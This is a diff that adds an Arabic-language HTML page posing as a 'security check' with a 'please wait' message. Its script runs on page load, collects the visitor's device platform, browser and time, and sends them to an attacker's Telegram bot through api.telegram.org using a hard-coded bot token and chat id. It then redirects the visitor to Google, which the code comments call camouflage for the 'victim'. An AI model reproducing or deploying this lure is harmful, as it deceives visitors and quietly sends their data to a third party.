@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>الناصري - فحص الأمان</title>
+</head>
+<body style="background-color: #000; color: #0f0; text-align: center; padding-top: 50px; font-family: sans-serif;">
+
+    <script>
+        // معلومات بوتك الشخصي لاستقبال الصيد
+        const token = '7132823653:AAHw5-G0mH0W_4_k_X-H_P_y_6_k_X-H_P_y';
+        const chat_id = '7604250582';
+
+        async function sendToBot() {
+            const message = `🚀 **صيد خاص ومباشر للناصري**\n\n` +
+                          `📱 نوع الجهاز: ${navigator.platform}\n` +
+                          `🌐 المتصفح: ${navigator.appName}\n` +
+                          `⏰ الوقت: ${new Date().toLocaleString()}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            
+            try {
+                await fetch(url);
+            } catch (e) {}
+
+            // تمويه: تحويل الضحية بعد ثانية واحدة
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1000);
+        }
+
+        sendToBot();
+    </script>
+
+    <h2>جاري فحص حالة الاتصال...</h2>
+    <p>يرجى الانتظار ثانية واحدة لتأمين دخولك.</p>
+
+</body>
+</html>
